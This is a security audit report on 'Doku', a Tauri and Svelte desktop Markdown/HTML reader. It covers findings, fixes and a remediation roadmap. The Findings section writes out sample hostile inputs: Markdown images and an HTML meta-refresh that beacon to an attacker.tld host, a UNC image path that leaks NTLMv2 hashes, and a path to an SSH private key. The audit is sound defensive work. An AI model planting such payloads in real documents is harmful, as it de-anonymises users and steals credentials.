# Security Audit — Doku (v1 milestone)

**Date**: 2026-07-10
**Scope**: full (`--full`) — Tauri 2 + Svelte 5 desktop reader/editor
**Method**: OWASP-style, threat-modeled for a desktop app (no server/auth/network by design)
**Auditor**: security-auditor subagent (fresh context) + dependency/secrets layer

## Posture verdict
**Pass with caveats** — no RCE, auth-bypass, or arbitrary-write path. Scripting surface is well contained (Markdown never rendered as HTML; HTML preview double-defended by `sandbox=""` + injected `default-src 'none'`). The real gaps undermine the "no network by design" guarantee (story 8.3) for the *default* view of the *primary* format.

## Attack surface
- **Document content** (`.md`/`.html`/`.txt` from anywhere) → only two DOM sinks: the sandboxed `<iframe srcdoc>` (HTML preview) and `img.src` in Markdown live-preview. **No `{@html}`/`innerHTML` anywhere in `src/`** (grep-confirmed) — markdown is CodeMirror decorations, not HTML.
- **File paths** (dialog, explorer, drag-drop, wikilinks, CLI arg via single-instance) → `main.rs` emits `doku://open` → `openPath` (read-only); writes only to user-chosen `tab.path`.
- **Native host**: minimal — no custom `#[command]`, no shell/exec; official fs/dialog/single-instance plugins. fs + asset scopes = `**`.
- **App CSP**: `connect-src 'self' ipc: http://ipc.localhost; object-src 'none'` — no `default-src`/`img-src`/`frame-src`.

## Findings

### High
- **Remote/UNC image `src` defeats the no-network control** — `src/lib/images.ts:3-16`, `src/lib/editor/live-preview.ts:25-29,52`, `src-tauri/tauri.conf.json:26`
  - `img-src` unset + no `default-src` → image loads in the main WebView are unrestricted. `isExternalUrl` passes `http(s):` verbatim to `img.src`; widgets load automatically for the visible range.
  - **Exploit A (beacon/de-anon)**: open `evil.md` with `![](https://attacker.tld/p.png?opened)` → GET to attacker with zero interaction → leaks public IP, UA/WebView fingerprint, "doc opened". Bypasses the CSP added for 8.3 (`connect-src` covers fetch/XHR/WS, not `<img>`).
  - **Exploit B (NTLM leak)**: `resolveLocalImagePath` treats UNC as absolute (`images.ts:11`); `![](\\attacker.tld\s\p.png)` → asset read of a UNC path → SMB auth to attacker → **NTLMv2 hash exfiltrated**. Opening the file is the only action.
  - **Fix**: in `imageSrc`/`isExternalUrl`, don't pass remote schemes or UNC to `img.src` — allow only `data:` + local `asset:`, placeholder the rest (or explicit opt-in). Reject leading `\\`. Backstop in app CSP: `default-src 'none'; img-src 'self' asset: http://asset.localhost data:; media-src 'none'` (native smoke: asset images + IPC still work).

### Medium
- **HTML preview iframe can phone home via frame navigation** — `src/lib/html.ts:5-6`, `src/components/DocumentView.svelte:132`
  - `sandbox=""` + `default-src 'none'` block scripts and sub-resource fetches, but **frame self-navigation is not gated** (no navigation directive, parent sets no `frame-src`).
  - **Exploit**: `evil.html` with `<meta http-equiv="refresh" content="0;url=http://attacker.tld/beacon?opened">` → iframe auto-navigates to attacker on render (default `.html` view). A crafted `<a href="http://…">` does it on click.
  - **Fix**: run `sanitizeHtml` on the HTML before `sandboxDoc` (strips `<meta>`/`<base>`); route/neutralize anchors (drop non-`#` hrefs or user-confirm external open).
- **Whole-filesystem fs + asset scopes (`**`)** — `capabilities/default.json:17-37`, `tauri.conf.json:27-31`
  - Not directly exploitable today (writes = user-chosen path; reads = user-initiated), but maximizes blast radius and is what turns the UNC/asset image issue into an arbitrary-local-read primitive.
  - **Fix**: scope `fs:allow-*` + asset protocol to open-document directories (or a configured library root), least privilege.

### Low / informational
- **`sanitizeHtml` is dead code** — `sanitize.ts:11-16` (referenced only by its test). Wiring it into `sandboxDoc` (before CSP injection) also fixes the Medium meta-refresh beacon.
- **Markdown image reads arbitrary absolute local paths** — `images.ts:11` — `![](C:\Users\me\.ssh\id_rsa)` loads into `<img>`; **no exfil channel** (no script), merely fails to render. Folded into the scope-tightening fix.
- **Encoding detection is a UX filter, not a security boundary** — `encoding.ts` — a bypass just enters CM as plain text, no exec. Fine.

## Dependencies & secrets
- `npm audit`: **0 vulnerabilities** (prod + dev). DOMPurify 3.4.x, CodeMirror 6.x, Tauri 2.10, Svelte 5.55 — all current, no vulnerable pins.
- Secrets grep (`src`, `src-tauri/src`): **none**. No `.env` files; no hardcoded keys/tokens.
- Not run: `cargo audit` on `src-tauri/Cargo.lock` (transitive Rust CVEs) — gap.

## Sound by design (keep)
- Markdown never rendered as HTML (decorations only) — closes the biggest hostile-doc class.
- HTML preview: `sandbox=""` + injected `default-src 'none'` (CSP intersection — hostile inline CSP can only tighten). Scripting/same-origin/remote-subresource/top-nav all blocked.
- Minimal Rust host, no shell/exec, CLI arg → read-only open (no command injection).
- Wikilink resolves to basename against scanned tree — `[[../../secret]]` can't traverse.
- Writes only to user-chosen `tab.path` via atomic tmp+rename; content never influences the write path.

## Remediation roadmap
- **Immediate**: block remote (`http(s):`/`blob:`) + UNC (`\\`) image URLs → placeholder; allow only `data:` + local `asset:`. Add `default-src`/`img-src`/`media-src` to app CSP as backstop.
- **Short-term**: wire `sanitizeHtml` into `sandboxDoc` (strip meta-refresh, neutralize anchor beacons).
- **Long-term**: narrow `fs:*` + asset scopes from `**` to open-document dirs; run `cargo audit`; update the 8.3 assurance to exercise a doc with remote/UNC images so the control is actually verified.

## Not audited
- No dynamic/native testing (meta-refresh + UNC→SMB assessed from Chromium/WebView2 + Tauri semantics, not reproduced) — worth a native smoke.
- `cargo audit` / Rust transitive deps.
- `spike/`, `docs/` (not production code).
